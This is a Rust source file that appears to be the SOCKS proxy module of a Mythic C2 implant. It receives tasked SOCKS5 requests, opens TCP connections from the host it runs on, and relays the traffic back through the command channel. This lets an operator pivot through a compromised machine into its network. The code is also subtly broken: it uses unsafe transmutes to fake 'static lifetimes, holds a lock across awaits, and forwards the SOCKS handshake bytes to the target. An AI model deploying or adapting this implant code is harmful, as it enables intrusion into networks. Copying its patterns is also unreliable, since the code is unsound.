use crate::agent::AgentTask;
use crate::mythic_continued;
use base64::{decode, encode};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, SocketAddr, ToSocketAddrs};
use std::sync::{mpsc, Arc, Mutex};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::net::tcp::{ReadHalf, WriteHalf};

#[derive(Deserialize, Serialize, Debug, Clone)]
pub struct SocksMsg {
    pub exit: bool,
    pub server_id: u32,
    pub data: String,
}

#[derive(Debug)]
pub struct SocksState {
    pub connections: Arc<Mutex<HashMap<u32, WriteHalf<'static>>>>,
}

impl SocksState {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(Mutex::new(HashMap::new())),
        }
    }
}

pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_continued!(task.id, "success", "SOCKS relay started"))?;
    
    let state = Arc::new(SocksState::new());
    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(relay_loop(tx.clone(), rx, state));
    Ok(())
}

async fn relay_loop(tx: mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>, state: Arc<SocksState>) {
    while let Ok(msg) = rx.recv() {
        if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
            if task.command == "socks_data" {
                if let Ok(msgs) = serde_json::from_str::<Vec<SocksMsg>>(&task.parameters) {
                    process_messages(&tx, msgs, &state).await;
                }
            }
        }
    }
}

async fn process_messages(tx: &mpsc::Sender<serde_json::Value>, msgs: Vec<SocksMsg>, state: &Arc<SocksState>) {
    let mut conns = state.connections.lock().unwrap();

    for msg in msgs {
        if msg.exit {
            conns.remove(&msg.server_id);
            continue;
        }

        let data = decode(&msg.data).unwrap_or_default();

        if let Some(writer) = conns.get_mut(&msg.server_id) {
            let _ = writer.write_all(&data).await;
        } else {
            let addr = parse_socks_address(&data);
            if let Some(addr) = addr {
                if let Ok(stream) = TcpStream::connect(addr).await {
                    let (reader, writer) = stream.split();
                    
                    let writer: WriteHalf<'static> = unsafe { std::mem::transmute(writer) };
                    let reader: ReadHalf<'static> = unsafe { std::mem::transmute(reader) };
                    
                    let _ = writer.write_all(&data).await;
                    conns.insert(msg.server_id, writer);
                    
                    let tx_clone = tx.clone();
                    let state_clone = state.clone();
                    tokio::spawn(async move {
                        relay_stream_reader(msg.server_id, reader, tx_clone, state_clone).await;
                    });
                }
            }
        }
    }
}

async fn relay_stream_reader(id: u32, mut reader: ReadHalf<'static>, tx: mpsc::Sender<serde_json::Value>, state: Arc<SocksState>) {
    let mut buf = [0u8; 4096];
    loop {
        match reader.read(&mut buf).await {
            Ok(0) => break,
            Ok(n) => {
                let data = encode(&buf[..n]);
                let msg = SocksMsg { exit: false, server_id: id, data };
                let json = serde_json::to_string(&vec![msg]).unwrap();
                let _ = tx.send(serde_json::json!({
                    "command": "socks_data",
                    "parameters": json,
                    "id": format!("socks_outbound_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis())
                }));
            }
            Err(_) => break,
        }
    }
    let _ = tx.send(serde_json::json!({
        "command": "socks_data",
        "parameters": serde_json::to_string(&vec![SocksMsg { exit: true, server_id: id, data: String::new() }]).unwrap(),
        "id": format!("socks_outbound_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis())
    }));
    // Remover la conexión del estado
    state.connections.lock().unwrap().remove(&id);
}

fn parse_socks_address(data: &[u8]) -> Option<SocketAddr> {
    if data.len() < 6 || data[0] != 5 || data[1] != 1 {
        return None;
    }
    let atyp = data[3];
    let mut idx = 4;
    match atyp {
        1 => {
            if data.len() < idx + 6 { return None; }
            let ip = Ipv4Addr::new(data[idx], data[idx+1], data[idx+2], data[idx+3]);
            idx += 4;
            let port = u16::from_be_bytes([data[idx], data[idx+1]]);
            Some(SocketAddr::from((ip, port)))
        }
        3 => {
            let len = data[idx] as usize;
            idx += 1;
            if data.len() < idx + len + 2 { return None; }
            let domain = String::from_utf8_lossy(&data[idx..idx+len]).to_string();
            idx += len;
            let port = u16::from_be_bytes([data[idx], data[idx+1]]);
            (domain.as_str(), port).to_socket_addrs().ok()?.next()
        }
        _ => None,
    }
}
